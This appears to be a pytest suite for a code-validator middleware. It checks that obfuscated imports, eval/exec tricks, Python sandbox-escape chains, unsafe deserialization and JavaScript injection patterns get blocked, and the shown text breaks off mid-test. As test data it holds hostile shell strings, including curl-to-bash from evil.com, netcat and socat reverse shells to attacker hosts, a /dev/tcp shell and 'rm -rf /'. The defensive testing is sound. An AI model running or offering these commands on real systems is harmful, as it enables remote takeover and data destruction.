"""Attack simulation tests for code validation.

Tests various obfuscation and bypass techniques to ensure the validator
catches real-world attack patterns.
"""

from __future__ import annotations

import base64
import json

import pytest
from starlette.requests import Request
from starlette.responses import Response

from proxy.middleware.code_validator import CodeValidatorMiddleware
from proxy.middleware.pipeline import RequestContext
from proxy.validation.code_validator import CodeValidator


# ---------------------------------------------------------------------------
# Import Obfuscation
# ---------------------------------------------------------------------------


class TestImportObfuscation:
    """Attempts to smuggle imports past the validator."""

    def test_importlib_import_module(self):
        """importlib.import_module('os') is caught."""
        v = CodeValidator()
        result = v.validate("import importlib\nimportlib.import_module('os')", "python")
        assert not result.valid

    def test_dunder_import(self):
        """__import__('os') is caught."""
        v = CodeValidator()
        result = v.validate("__import__('os')", "python")
        assert not result.valid

    def test_aliased_import(self):
        """import os as o is caught."""
        v = CodeValidator()
        result = v.validate("import os as operating_system", "python")
        assert not result.valid

    def test_from_import(self):
        """from os import system is caught."""
        v = CodeValidator()
        result = v.validate("from os import system", "python")
        assert not result.valid

    def test_star_import(self):
        """from os import * is caught."""
        v = CodeValidator()
        result = v.validate("from os import *", "python")
        assert not result.valid

    def test_conditional_import(self):
        """Conditional import in if block is caught."""
        v = CodeValidator()
        code = "if True:\n    import os"
        result = v.validate(code, "python")
        assert not result.valid

    def test_try_except_import(self):
        """Import in try/except is caught."""
        v = CodeValidator()
        code = "try:\n    import os\nexcept:\n    pass"
        result = v.validate(code, "python")
        assert not result.valid

    def test_nested_module_import(self):
        """import os.path is caught (os prefix)."""
        v = CodeValidator()
        result = v.validate("import os.path", "python")
        assert not result.valid


# ---------------------------------------------------------------------------
# Eval/Exec Obfuscation
# ---------------------------------------------------------------------------


class TestEvalExecObfuscation:
    """Attempts to smuggle eval/exec past the validator."""

    def test_base64_exec(self):
        """exec(base64.b64decode(...)) with encoded payload is caught."""
        payload = base64.b64encode(b"import os").decode()
        code = f'import base64\nexec(base64.b64decode("{payload}"))'
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        # Should catch both the exec call and the base64 content
        rule_ids = {f.rule_id for f in result.findings}
        assert "py-builtin-exec" in rule_ids

    def test_chr_concat_eval(self):
        """eval(chr(111)+chr(115)) is caught (the eval call itself)."""
        code = "eval(chr(111)+chr(115))"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        assert any(f.rule_id == "py-builtin-eval" for f in result.findings)

    def test_hex_string_exec(self):
        """exec('\\x69\\x6d...') is caught."""
        code = "exec('\\x69\\x6d\\x70\\x6f\\x72\\x74\\x20\\x6f\\x73')"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid

    def test_reversed_exec(self):
        """exec(''.join(reversed(...))) is caught (exec call)."""
        code = "exec(''.join(reversed('so tropmi')))"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid

    def test_compile_exec(self):
        """compile() + exec() chain is caught."""
        code = "code = compile('x=1', '<s>', 'exec')\nexec(code)"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        rule_ids = {f.rule_id for f in result.findings}
        assert "py-builtin-compile" in rule_ids
        assert "py-builtin-exec" in rule_ids

    def test_nested_eval(self):
        """eval(eval(...)) is caught."""
        code = "eval(eval('1+1'))"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid

    def test_bytes_decode_exec(self):
        """exec(b'...'.decode()) is caught (exec call)."""
        code = "exec(b'import os'.decode())"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid

    def test_globals_subscript_builtins(self):
        """globals()['__builtins__'] — subscript access is now caught."""
        code = "globals()['__builtins__']"
        v = CodeValidator()
        result = v.validate(code, "python")
        # Subscript access to __builtins__ is now caught as high severity
        assert not result.valid
        assert any(f.rule_id == "py-subscript-__builtins__" for f in result.findings)

    def test_base64_in_string_literal(self):
        """Base64 encoded dangerous content in string literal is caught."""
        payload = base64.b64encode(b"import subprocess").decode()
        code = f'encoded = "{payload}"'
        v = CodeValidator()
        result = v.validate(code, "python")
        assert any(f.rule_id == "py-base64-obfuscation" for f in result.findings)

    def test_subscript_import(self):
        """globals()['__import__'] subscript bypass is caught."""
        code = "globals()['__import__']('os')"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        assert any(f.rule_id == "py-subscript-__import__" for f in result.findings)

    def test_subscript_globals(self):
        """obj['__globals__'] subscript bypass is caught."""
        code = "x = func['__globals__']"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        assert any(f.rule_id == "py-subscript-__globals__" for f in result.findings)

    def test_subscript_code(self):
        """obj['__code__'] subscript bypass is caught."""
        code = "c = func['__code__']"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        assert any(f.rule_id == "py-subscript-__code__" for f in result.findings)


# ---------------------------------------------------------------------------
# Decorator Bypass
# ---------------------------------------------------------------------------


class TestDecoratorBypass:
    """Attempts to abuse decorators to call dangerous builtins."""

    def test_exec_decorator(self):
        """@exec is caught."""
        code = "@exec\ndef f():\n    pass"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        assert any(f.rule_id == "py-decorator-exec" for f in result.findings)

    def test_eval_decorator(self):
        """@eval is caught."""
        code = "@eval\ndef f():\n    pass"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        assert any(f.rule_id == "py-decorator-eval" for f in result.findings)

    def test_compile_decorator(self):
        """@compile is caught."""
        code = "@compile\ndef f():\n    pass"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        assert any(f.rule_id == "py-decorator-compile" for f in result.findings)

    def test_dunder_import_decorator(self):
        """@__import__ is caught."""
        code = "@__import__\ndef f():\n    pass"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        assert any(f.rule_id == "py-decorator-__import__" for f in result.findings)

    def test_async_function_exec_decorator(self):
        """@exec on async function is caught."""
        code = "@exec\nasync def f():\n    pass"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        assert any(f.rule_id == "py-decorator-exec" for f in result.findings)

    def test_class_exec_decorator(self):
        """@exec on class is caught."""
        code = "@exec\nclass Foo:\n    pass"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        assert any(f.rule_id == "py-decorator-exec" for f in result.findings)


# ---------------------------------------------------------------------------
# Attribute Access Bypass
# ---------------------------------------------------------------------------


class TestAttributeAccessBypass:
    """Attempts to access dangerous attributes via indirect means."""

    def test_getattr_import(self):
        """getattr(builtins, '__import__') is caught."""
        code = "getattr(builtins, '__import__')"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid

    def test_getattr_builtins(self):
        """getattr(obj, '__builtins__') is caught."""
        code = "getattr(obj, '__builtins__')"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid

    def test_getattr_globals(self):
        """getattr(func, '__globals__') is caught."""
        code = "getattr(func, '__globals__')"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid

    def test_direct_globals_access(self):
        """func.__globals__ is caught."""
        code = "x = func.__globals__"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert any("__globals__" in f.rule_id for f in result.findings)

    def test_direct_builtins_access(self):
        """obj.__builtins__ is caught."""
        code = "x = obj.__builtins__"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert any("__builtins__" in f.rule_id for f in result.findings)

    def test_subclasses_chain(self):
        """().__class__.__bases__[0].__subclasses__() is caught."""
        code = "().__class__.__bases__[0].__subclasses__()"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        attrs = {f.rule_id for f in result.findings}
        assert any("__class__" in a or "__bases__" in a or "__subclasses__" in a for a in attrs)

    def test_mro_access(self):
        """obj.__mro__ is caught."""
        code = "x = obj.__mro__"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert any("__mro__" in f.rule_id for f in result.findings)

    def test_dict_access(self):
        """obj.__dict__ is caught."""
        code = "x = obj.__dict__"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert any("__dict__" in f.rule_id for f in result.findings)


# ---------------------------------------------------------------------------
# Code Object Manipulation
# ---------------------------------------------------------------------------


class TestCodeObjectManipulation:
    """Attempts to create/manipulate code objects directly."""

    def test_types_codetype(self):
        """types.CodeType() construction is caught."""
        code = "import types\ntypes.CodeType(0, 0, 0, 0, 0, b'', (), (), (), '', '', 0, b'')"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid

    def test_types_functiontype(self):
        """types.FunctionType() construction is caught."""
        code = "import types\ntypes.FunctionType(code_obj, globals())"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid

    def test_marshal_loads(self):
        """marshal.loads() for code deserialization is caught."""
        code = "import marshal\ncode = marshal.loads(data)"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid

    def test_pickle_loads(self):
        """pickle.loads() is caught."""
        code = "import pickle\npickle.loads(data)"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid

    def test_dill_loads(self):
        """dill.loads() is caught."""
        code = "import dill\ndill.loads(data)"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid

    def test_compile_exec_chain(self):
        """compile() → exec() chain is caught."""
        code = "c = compile(src, '<string>', 'exec')\nexec(c)"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        rule_ids = {f.rule_id for f in result.findings}
        assert "py-builtin-compile" in rule_ids
        assert "py-builtin-exec" in rule_ids

    def test_yaml_load(self):
        """yaml.load() deserialization is caught."""
        code = "import yaml\nyaml.load(data)"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        assert any(f.rule_id == "py-deserialize-yaml" for f in result.findings)

    def test_yaml_unsafe_load(self):
        """yaml.unsafe_load() is caught."""
        code = "import yaml\nyaml.unsafe_load(data)"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        assert any(f.rule_id == "py-deserialize-yaml" for f in result.findings)

    def test_yaml_full_load(self):
        """yaml.full_load() is caught."""
        code = "import yaml\nyaml.full_load(data)"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        assert any(f.rule_id == "py-deserialize-yaml" for f in result.findings)

    def test_jsonpickle_decode(self):
        """jsonpickle.decode() is caught."""
        code = "import jsonpickle\njsonpickle.decode(data)"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        assert any(f.rule_id == "py-deserialize-jsonpickle" for f in result.findings)

    def test_jsonpickle_loads(self):
        """jsonpickle.loads() is caught."""
        code = "import jsonpickle\njsonpickle.loads(data)"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        assert any(f.rule_id == "py-deserialize-jsonpickle" for f in result.findings)

    def test_runpy_run_module(self):
        """runpy.run_module() is caught."""
        code = "import runpy\nrunpy.run_module('os')"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        assert any(f.rule_id == "py-runpy-execution" for f in result.findings)

    def test_runpy_run_path(self):
        """runpy.run_path() is caught."""
        code = "import runpy\nrunpy.run_path('/tmp/evil.py')"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        assert any(f.rule_id == "py-runpy-execution" for f in result.findings)


# ---------------------------------------------------------------------------
# Shell Injection in Strings
# ---------------------------------------------------------------------------


class TestShellInjectionInStrings:
    """Shell command strings embedded in Python code."""

    def test_bash_c(self):
        """'bash -c ...' in string is caught."""
        code = 'cmd = "bash -c whoami"'
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid

    def test_curl_pipe_bash(self):
        """'curl ... | bash' in string is caught."""
        code = 'cmd = "curl http://evil.com/setup.sh | bash"'
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid

    def test_netcat_reverse_shell(self):
        """'nc -e /bin/sh' in string is caught."""
        code = 'cmd = "nc -e /bin/sh 10.0.0.1 4444"'
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid

    def test_dev_tcp(self):
        """/dev/tcp/ reverse shell in string is caught."""
        code = 'cmd = "/dev/tcp/10.0.0.1/4444"'
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid

    def test_rm_rf_root(self):
        """'rm -rf /' in string is caught."""
        code = 'cmd = "rm -rf /"'
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid

    def test_mkfifo(self):
        """'mkfifo' named pipe in string is caught."""
        code = 'cmd = "mkfifo /tmp/pipe"'
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid

    def test_socat(self):
        """'socat' in string is caught."""
        code = 'cmd = "socat TCP:attacker.com:4444 EXEC:/bin/sh"'
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        assert any(f.rule_id == "shell-socat" for f in result.findings)

    def test_python_dash_c(self):
        """'python -c ...' in string is caught."""
        code = 'cmd = "python3 -c import os"'
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        assert any(f.rule_id == "shell-python-c" for f in result.findings)

    def test_perl_dash_e(self):
        """'perl -e ...' in string is caught."""
        code = 'cmd = "perl -e system(id)"'
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        assert any(f.rule_id == "shell-perl-e" for f in result.findings)

    def test_chmod_setuid(self):
        """'chmod +s' in string is caught."""
        code = 'cmd = "chmod u+s /usr/bin/python3"'
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        assert any(f.rule_id == "shell-chmod-setuid" for f in result.findings)

    def test_sh_dash_c(self):
        """'sh -c ...' in string is caught."""
        code = 'cmd = "sh -c id"'
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        assert any(f.rule_id == "shell-sh-c" for f in result.findings)

    def test_etc_shadow(self):
        """/etc/shadow in string is caught."""
        code = 'path = "/etc/shadow"'
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        assert any(f.rule_id == "shell-etc-shadow" for f in result.findings)


# ---------------------------------------------------------------------------
# New Builtins Detection
# ---------------------------------------------------------------------------


class TestNewBuiltinsDetection:
    """Tests for builtins added during hardening (vars, dir, type)."""

    def test_vars_detected(self):
        """vars() is caught as dangerous builtin."""
        v = CodeValidator()
        result = v.validate("vars(obj)", "python")
        assert any(f.rule_id == "py-builtin-vars" for f in result.findings)

    def test_dir_detected(self):
        """dir() is caught as dangerous builtin."""
        v = CodeValidator()
        result = v.validate("dir(obj)", "python")
        assert any(f.rule_id == "py-builtin-dir" for f in result.findings)

    def test_type_detected(self):
        """type() is caught as dangerous builtin."""
        v = CodeValidator()
        result = v.validate("type(obj)", "python")
        assert any(f.rule_id == "py-builtin-type" for f in result.findings)

    def test_input_detected(self):
        """input() is caught as dangerous builtin."""
        v = CodeValidator()
        result = v.validate("x = input('Enter: ')", "python")
        assert any(f.rule_id == "py-builtin-input" for f in result.findings)

    def test_memoryview_detected(self):
        """memoryview() is caught as dangerous builtin."""
        v = CodeValidator()
        result = v.validate("m = memoryview(b'hello')", "python")
        assert any(f.rule_id == "py-builtin-memoryview" for f in result.findings)


# ---------------------------------------------------------------------------
# JavaScript Attacks
# ---------------------------------------------------------------------------


class TestJavaScriptAttacks:
    """JavaScript-specific attack patterns."""

    def test_eval_with_spacing(self):
        """eval  ( 'code') with extra spacing is caught."""
        code = "eval  ( 'alert(1)' )"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid

    def test_function_constructor(self):
        """new Function('return process') is caught."""
        code = "var f = new Function('return process.env.SECRET')"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid

    def test_settimeout_string_exec(self):
        """setTimeout('alert(1)', 0) with string arg is caught."""
        code = "setTimeout('alert(1)', 0)"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid

    def test_require_child_process(self):
        """require('child_process') is caught."""
        code = "const {exec} = require('child_process')"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid

    def test_process_env_access(self):
        """process.env.SECRET is caught."""
        code = "const key = process.env.API_KEY"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid

    def test_prototype_pollution(self):
        """__proto__ manipulation is caught."""
        code = "obj.__proto__.isAdmin = true"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid

    def test_constructor_chain(self):
        """constructor['constructor'] is caught."""
        code = "a.constructor['constructor']('return this')()"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid

    def test_process_binding(self):
        """process.binding('spawn_sync') is caught."""
        code = "process.binding('spawn_sync')"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-process-binding" for f in result.findings)

    def test_process_dlopen(self):
        """process.dlopen() is caught."""
        code = "process.dlopen(module, '/tmp/evil.node')"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-process-dlopen" for f in result.findings)

    def test_reflect_apply(self):
        """Reflect.apply() is caught."""
        code = "Reflect.apply(eval, null, ['alert(1)'])"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-reflect-apply" for f in result.findings)

    def test_reflect_construct(self):
        """Reflect.construct() is caught."""
        code = "Reflect.construct(Function, ['return process'])"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-reflect-construct" for f in result.findings)

    def test_es6_import_from_child_process(self):
        """ES6 import from 'child_process' is caught."""
        code = "import { exec } from 'child_process'"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-import-from-cp" for f in result.findings)

    def test_es6_import_from_fs(self):
        """ES6 import from 'fs' is caught."""
        code = "import { readFile } from 'fs'"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-import-from-fs" for f in result.findings)

    def test_es6_import_from_vm(self):
        """ES6 import from 'vm' is caught."""
        code = "import { Script } from 'vm'"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-import-from-vm" for f in result.findings)

    def test_bracket_eval_access(self):
        """obj['eval'] bracket notation is caught."""
        code = "window['eval']('alert(1)')"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-bracket-eval" for f in result.findings)

    def test_bracket_constructor_access(self):
        """obj['constructor'] bracket notation is caught."""
        code = "x['constructor']('return this')()"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-bracket-constructor" for f in result.findings)

    def test_process_exit(self):
        """process.exit is caught."""
        code = "process.exit(0)"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-process-exit" for f in result.findings)

    def test_exec_sync(self):
        """execSync() is caught."""
        code = "const result = execSync('id')"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-exec-sync" for f in result.findings)

    def test_spawn_sync(self):
        """spawnSync() is caught."""
        code = "spawnSync('ls', ['-la'])"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-spawn-sync" for f in result.findings)

    def test_globalthis_access(self):
        """globalThis is caught."""
        code = "const g = globalThis"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert any(f.rule_id == "js-globalthis" for f in result.findings)

    def test_setinterval_string_exec(self):
        """setInterval('code', 100) with string arg is caught."""
        code = "setInterval('alert(1)', 100)"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-setinterval-string" for f in result.findings)

    def test_dynamic_import_child_process(self):
        """import('child_process') dynamic import is caught."""
        code = "const cp = await import('child_process')"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        assert any(f.rule_id == "js-dynamic-import-cp" for f in result.findings)


# ---------------------------------------------------------------------------
# Fail-Closed Behavior
# ---------------------------------------------------------------------------


class TestFailClosed:
    """Validator fails closed on unexpected input."""

    def test_syntax_error_rejected(self):
        """Python syntax errors result in rejection."""
        v = CodeValidator()
        result = v.validate("def foo(:", "python")
        assert not result.valid

    def test_null_bytes_handled(self):
        """Code with null bytes is handled (either parse error or flagged)."""
        v = CodeValidator()
        result = v.validate("x = 1\x00import os", "python")
        # Should either fail to parse or catch the import
        assert not result.valid

    def test_binary_content_rejected(self):
        """Binary/non-text content is rejected."""
        v = CodeValidator()
        result = v.validate("\x89PNG\r\n\x1a\n", "python")
        # Should fail to parse
        assert not result.valid

    def test_deeply_nested_ast(self):
        """Deeply nested code is handled without crash."""
        # Generate deeply nested expression
        code = "x = " + "(" * 50 + "1" + ")" * 50
        v = CodeValidator()
        result = v.validate(code, "python")
        # Should parse successfully, no dangerous patterns
        assert result.valid is True

    def test_oversized_code_rejected(self):
        """Code exceeding MAX_CODE_SIZE is rejected."""
        v = CodeValidator()
        result = v.validate("x = 1\n" * 20000, "python")
        assert not result.valid

    def test_unicode_bom_handled(self):
        """Code with Unicode BOM is handled without crash (fail-closed)."""
        v = CodeValidator()
        code = "\ufeffx = 5 + 3"
        result = v.validate(code, "python")
        # Python 3.14 rejects BOM as invalid non-printable character
        # Fail-closed: syntax error → valid=False (safe behavior)
        assert result is not None  # Handled without crash
        assert result.valid is False  # BOM causes syntax error → reject

    def test_validator_internal_crash_fail_closed(self):
        """If the sub-validator crashes, result is valid=False."""
        from unittest.mock import patch

        v = CodeValidator()
        with patch.object(v._python, "validate", side_effect=RuntimeError("boom")):
            result = v.validate("x = 1", "python")
        assert result.valid is False
        assert any(f.rule_id == "validator-internal-error" for f in result.findings)

    def test_js_validator_crash_fail_closed(self):
        """If the JS sub-validator crashes, result is valid=False."""
        from unittest.mock import patch

        v = CodeValidator()
        with patch.object(v._javascript, "validate", side_effect=RuntimeError("boom")):
            result = v.validate("const x = 1;", "javascript")
        assert result.valid is False
        assert any(f.rule_id == "validator-internal-error" for f in result.findings)


# ---------------------------------------------------------------------------
# Middleware-Level Attacks
# ---------------------------------------------------------------------------


class TestMiddlewareAttacks:
    """Test attack patterns at the middleware layer."""

    @pytest.fixture
    def mw(self):
        return CodeValidatorMiddleware()

    def _ctx(
        self,
        *,
        endpoints: list[str] | None = None,
        mode: str = "block",
        code_fields: list[str] | None = None,
    ) -> RequestContext:
        ctx = RequestContext()
        ctx.tenant_id = "test"
        cv_cfg: dict = {"mode": mode, "protected_endpoints": endpoints or ["/api/execute"]}
        if code_fields is not None:
            cv_cfg["code_fields"] = code_fields
        ctx.customer_config = {
            "enabled_features": {"code_validator": True},
            "settings": {"code_validator": cv_cfg},
        }
        return ctx

    def _req(self, body: bytes, path: str = "/api/execute", method: str = "POST") -> Request:
        scope = {
            "type": "http",
            "method": method,
            "path": path,
            "query_string": b"",
            "headers": [(b"content-type", b"application/json")],
        }
        req = Request(scope)
        req._body = body
        return req

    @pytest.mark.asyncio
    async def test_duplicate_json_keys_rejected(self, mw):
        """Duplicate JSON keys (parser differential) are rejected."""
        # Manually craft JSON with duplicate keys
        body = b'{"code": "x = 1", "language": "python", "code": "import os"}'
        req = self._req(body)
        ctx = self._ctx()
        result = await mw.process_request(req, ctx)
        assert isinstance(result, Response)
        assert result.status_code == 400
        resp = json.loads(result.body)
        assert "duplicate" in resp["message"].lower()

    @pytest.mark.asyncio
    async def test_nested_code_field_scanned(self, mw):
        """Code smuggled into nested object is detected."""
        body = json.dumps({
            "data": {"code": "import os"},
            "language": "python",
        }).encode()
        req = self._req(body)
        ctx = self._ctx()
        result = await mw.process_request(req, ctx)
        assert isinstance(result, Response)
        assert result.status_code == 400

    @pytest.mark.asyncio
    async def test_multiple_code_fields_all_scanned(self, mw):
        """All code fields are scanned, not just the first."""
        body = json.dumps({
            "code": "x = 1",  # clean
            "script": "import subprocess",  # dangerous
            "language": "python",
        }).encode()
        req = self._req(body)
        ctx = self._ctx(code_fields=["code", "script"])
        result = await mw.process_request(req, ctx)
        assert isinstance(result, Response)
        assert result.status_code == 400

    @pytest.mark.asyncio
    async def test_empty_body_blocked(self, mw):
        """Empty body on protected endpoint is blocked."""
        req = self._req(b"")
        ctx = self._ctx()
        result = await mw.process_request(req, ctx)
        assert isinstance(result, Response)
        assert result.status_code == 400

    @pytest.mark.asyncio
    async def test_empty_body_detect_only_passes(self, mw):
        """Empty body in detect_only mode passes through."""
        req = self._req(b"")
        ctx = self._ctx(mode="detect_only")
        result = await mw.process_request(req, ctx)
        assert result is None

    @pytest.mark.asyncio
    async def test_array_body_blocked(self, mw):
        """JSON array body on protected endpoint is blocked."""
        req = self._req(b'[{"code": "import os"}]')
        ctx = self._ctx()
        result = await mw.process_request(req, ctx)
        assert isinstance(result, Response)
        assert result.status_code == 400

    @pytest.mark.asyncio
    async def test_put_request_scanned(self, mw):
        """PUT requests on protected endpoints are scanned."""
        body = json.dumps({"code": "import os", "language": "python"}).encode()
        req = self._req(body, method="PUT")
        ctx = self._ctx()
        result = await mw.process_request(req, ctx)
        assert isinstance(result, Response)
        assert result.status_code == 400

    @pytest.mark.asyncio
    async def test_patch_request_scanned(self, mw):
        """PATCH requests on protected endpoints are scanned."""
        body = json.dumps({"code": "import os", "language": "python"}).encode()
        req = self._req(body, method="PATCH")
        ctx = self._ctx()
        result = await mw.process_request(req, ctx)
        assert isinstance(result, Response)
        assert result.status_code == 400

    @pytest.mark.asyncio
    async def test_error_response_never_echoes_code(self, mw):
        """Error response must never contain the submitted code."""
        evil_code = "import subprocess; subprocess.call(['id'])"
        body = json.dumps({"code": evil_code, "language": "python"}).encode()
        req = self._req(body)
        ctx = self._ctx()
        result = await mw.process_request(req, ctx)
        resp_text = result.body.decode()
        assert "subprocess" not in resp_text
        assert "import" not in resp_text

    @pytest.mark.asyncio
    async def test_non_string_language_uses_default(self, mw):
        """Non-string language field falls back to default."""
        body = json.dumps({"code": "import os", "language": 42}).encode()
        req = self._req(body)
        ctx = self._ctx()
        result = await mw.process_request(req, ctx)
        # Should still validate using default language (python)
        assert isinstance(result, Response)
        assert result.status_code == 400

    @pytest.mark.asyncio
    async def test_wildcard_endpoint_match(self, mw):
        """Wildcard endpoint patterns work."""
        body = json.dumps({"code": "import os", "language": "python"}).encode()
        req = self._req(body, path="/api/v2/execute")
        ctx = self._ctx(endpoints=["/api/*/execute"])
        result = await mw.process_request(req, ctx)
        assert isinstance(result, Response)
        assert result.status_code == 400

    @pytest.mark.asyncio
    async def test_recursion_error_handled(self, mw):
        """Deeply nested JSON that triggers RecursionError is handled."""
        # Build deeply nested JSON structure
        nested = '{"a":' * 100 + '"x"' + '}' * 100
        body = nested.encode()
        req = self._req(body)
        ctx = self._ctx()
        # Should not raise, should return 400 or None
        result = await mw.process_request(req, ctx)
        # Either blocked or parsed successfully — no crash
        assert result is None or (isinstance(result, Response) and result.status_code == 400)

    @pytest.mark.asyncio
    async def test_duplicate_keys_detect_only_passes(self, mw):
        """Duplicate JSON keys in detect_only mode pass through."""
        body = b'{"code": "x = 1", "language": "python", "code": "y = 2"}'
        req = self._req(body)
        ctx = self._ctx(mode="detect_only")
        result = await mw.process_request(req, ctx)
        # detect_only: log but don't block
        assert result is None


# ---------------------------------------------------------------------------
# Combination Attacks
# ---------------------------------------------------------------------------


class TestCombinationAttacks:
    """Multi-vector attacks combining several bypass techniques."""

    def test_base64_exec_with_getattr(self):
        """Combine base64 encoding + exec + getattr."""
        code = "import base64\nexec(base64.b64decode('aW1wb3J0IG9z'))"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        rule_ids = {f.rule_id for f in result.findings}
        assert "py-builtin-exec" in rule_ids

    def test_subclasses_to_os_system(self):
        """Full jail escape chain: subclasses → os.system."""
        code = "().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['system']('id')"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        rule_ids = {f.rule_id for f in result.findings}
        # Should catch at least: __class__, __bases__, __subclasses__, __globals__
        assert any("__class__" in rid or "__bases__" in rid or "__subclasses__" in rid for rid in rule_ids)
        assert any("__globals__" in rid for rid in rule_ids)

    def test_import_plus_shell_string(self):
        """import os + shell string: multiple findings."""
        code = 'import os\ncmd = "rm -rf /"'
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        rule_ids = {f.rule_id for f in result.findings}
        assert "py-import-os" in rule_ids
        assert "shell-rm-rf-root" in rule_ids

    def test_eval_with_base64_and_compile(self):
        """eval + compile + base64: all caught."""
        code = "import base64\neval(compile(base64.b64decode('eD0x'), '<s>', 'exec'))"
        v = CodeValidator()
        result = v.validate(code, "python")
        assert not result.valid
        rule_ids = {f.rule_id for f in result.findings}
        assert "py-builtin-eval" in rule_ids
        assert "py-builtin-compile" in rule_ids

    def test_js_reflect_apply_eval(self):
        """Reflect.apply(eval, ...) — indirect eval via Reflect."""
        code = "Reflect.apply(eval, null, ['alert(document.cookie)'])"
        v = CodeValidator()
        result = v.validate(code, "javascript")
        assert not result.valid
        rule_ids = {f.rule_id for f in result.findings}
        # Reflect.apply is caught; eval here is a reference (no parens), so js-eval regex won't match
        assert "js-reflect-apply" in rule_ids


# ---------------------------------------------------------------------------
# False Positive Avoidance
# ---------------------------------------------------------------------------


class TestFalsePositiveAvoidance:
    """Legitimate code should not be blocked."""

    def test_json_math_datetime_pass(self):
        """Legitimate imports like json, math, datetime pass."""
        v = CodeValidator()
        result = v.validate("import json\nimport math\nimport datetime", "python")
        assert result.valid

    def test_print_len_range_allowed(self):
        """Common builtins like print, len, range are allowed."""
        v = CodeValidator()
        result = v.validate("print(len(range(10)))", "python")
        assert result.valid

    def test_clean_arithmetic(self):
        """Simple arithmetic code passes."""
        v = CodeValidator()
        code = "x = 5\ny = 10\nresult = x * y + 3\nprint(result)"
